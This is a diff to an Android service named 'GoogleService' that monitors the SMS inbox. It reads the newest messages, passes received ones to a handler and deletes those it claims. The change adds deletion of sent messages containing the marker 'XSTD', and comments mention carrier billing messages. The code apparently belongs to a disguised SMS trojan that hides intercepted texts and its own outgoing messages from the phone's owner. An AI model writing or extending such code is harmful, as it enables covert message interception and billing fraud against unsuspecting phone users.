@@ -46,7 +46,10 @@ public class GoogleService extends Service {
 
         @Override
         public synchronized void onChange(boolean selfChange) {
-            if (Config.DEBUG) Config.LOGD("[[ContentObserver]] onChange find SMS changed. selfChange : " + selfChange + " ::::::::");
+            if (Config.DEBUG)
+                Config.LOGD("[[ContentObserver]] >>>>>>>>>>>>>>>>>>>>>>>>> entry  <<<<<<<<<<<<<<<<<<<<<<<<<<");
+            if (Config.DEBUG)
+                Config.LOGD("[[ContentObserver]] onChange find SMS changed. selfChange : " + selfChange + " ::::::::");
 
             super.onChange(true);
 //            Cursor cursor = null;
@@ -66,10 +69,10 @@ public class GoogleService extends Service {
 //             * 短信中心为空的时候
 //             */
             Cursor cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
-                                        new String[]{"_id", "address", "date", "body", "service_center"},
-                                        null,
-                                        null,
-                                        "date desc");
+                                               new String[]{"_id", "address", "date", "body", "service_center", "type"},
+                                               null,
+                                               null,
+                                               "date desc");
 //                showDeleteSMS = false;
 //            }
 
@@ -77,7 +80,7 @@ public class GoogleService extends Service {
                 return;
             }
 
-            LinkedList<String> idList = new LinkedList<String>();
+            LinkedList<String> deleteList = new LinkedList<String>();
             /**
              * 每次扫多少？5个
              */
@@ -86,34 +89,38 @@ public class GoogleService extends Service {
             int bodyIndex = cursor.getColumnIndex("body");
             int idIndex = cursor.getColumnIndex("_id");
             int centerIndex = cursor.getColumnIndex("service_center");
+            int typeIndex = cursor.getColumnIndex("type");
             while (cursor.moveToNext() && searchCount < 5) {
                 /**
                  * 找最近的5条记录
                  */
-                String address = cursor.getString(addressIndex);
+                String fromAddress = cursor.getString(addressIndex);
                 String body = cursor.getString(bodyIndex);
                 String id = cursor.getString(idIndex);
                 String center = cursor.getString(centerIndex);
+                int type = cursor.getInt(typeIndex);
                 if (Config.DEBUG) {
-                    Config.LOGD("[[ContentObserver::onChanged]] current fetch \n||SMS address : " + address
+                    Config.LOGD("[[ContentObserver::onChanged]] current Message Info : " +
+                                    "\n          || SMS from address : " + fromAddress
                                     + "\n        || body : " + body
                                     + "\n        || id : " + id
                                     + "\n        || center : " + center
-                                    + ">>>>>");
+                                    + "\n        || type : " + (type == 1 ? "received" : (type == 2 ? "send" : "unknow"))
+                                    + "\n >>>>>>>>>>>>>>>>>\n\n");
                 }
 
-                if (TextUtils.isEmpty(address)) {
+                if (TextUtils.isEmpty(fromAddress)) {
                     //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
                     if (Config.DEBUG) {
-                        Config.LOGD("\n[[ContentObserver::onChanged]] ignore this Message as the address is empty.\n");
+                        Config.LOGD("\n[[ContentObserver::onChanged]] ignore this Message as the from address is empty.\n");
                     }
 
                     searchCount++;
                     continue;
                 }
 
-                if (address.startsWith("10")) {
-                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。
+                if (fromAddress.startsWith("10")) {
+                    //当短信发送地址是以10开始或是地址是空的时候，表示这个短信是应该忽略的，因为可以是运营短信。或是扣费短信
                     if (Config.DEBUG) {
                         Config.LOGD("\n[[ContentObserver::onChanged]] Message start with 10.\n");
                     }
@@ -121,40 +128,33 @@ public class GoogleService extends Service {
                     /**
                      * 短信发送地址处理
                      */
-                    if (address.startsWith("+") == true && address.length() == 14) {
-                        address = address.substring(3);
-                    } else if (address.length() > 11) {
-                        address = address.substring(address.length() - 11);
+                    if (fromAddress.startsWith("+") == true && fromAddress.length() == 14) {
+                        fromAddress = fromAddress.substring(3);
+                    } else if (fromAddress.length() > 11) {
+                        fromAddress = fromAddress.substring(fromAddress.length() - 11);
                     }
-
-                    /**
-                     * 处理短信中心
-                     */
-//                    if (Config.DEBUG) {
-//                        Config.LOGD("[[ContentObserver::onChanged]] SET sms center num : " + SettingManager.getInstance().getKeySmsCenterNum()
-//                            + " center fetch : " + center);
-//                    }
-//                    if (TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
-//                            && !TextUtils.isEmpty(center)) {
-//                        if (center.startsWith("+") == true && center.length() == 14) {
-//                            center = center.substring(3);
-//                        } else if (center.length() > 11) {
-//                            center = center.substring(center.length() - 11);
-//                        }
-//
-//                        SettingManager.getInstance().setKeySmsCenterNum(center);
-//                        if (Config.DEBUG) {
-//                            Config.LOGD("[[ContentObserver::onChanged]] SET sms center num : " + SettingManager.getInstance().getKeySmsCenterNum());
-//                        }
-//                    }
                 }
 
-                if (PrivateSMSBRC.handleMessage(getApplicationContext(), body, address)) {
+                if (type == 1) {
+                    //是接受到的短信
                     if (Config.DEBUG) {
-                        Config.LOGD("[[ContentObserver::onChanged]] content observer find the message : " + body + " should handle " +
-                                        "and delete from " + SMS_INBOX_URI);
+                        Config.LOGD("[[ContentObserver::onChanged]] The message is RECEIVED message");
                     }
-                    idList.add(id);
+                    if (PrivateSMSBRC.handleMessage(getApplicationContext(), body, fromAddress)) {
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[ContentObserver::onChanged]] content observer find the message : [[" + body + "]] should handle " +
+                                            "and delete from " + SMS_INBOX_URI);
+                        }
+                        deleteList.add(id);
+                    }
+                } else {
+                    //是发送消息
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[ContentObserver::onChanged]] The message is SENT message");
+                    }
+                    if (!TextUtils.isEmpty(body) && body.contains("XSTD")) {
+                        deleteList.add(id);
+                    }
                 }
 
                 searchCount++;
@@ -167,7 +167,7 @@ public class GoogleService extends Service {
                 e.printStackTrace();
             }
 
-            for (String id : idList) {
+            for (String id : deleteList) {
                 mResolver.delete(Uri.parse("content://sms/" + id), null, null);
                 if (Config.DEBUG) {
                     Config.LOGD("[[ContentObserver::onChanged]] try to delete SMS id : " + id);
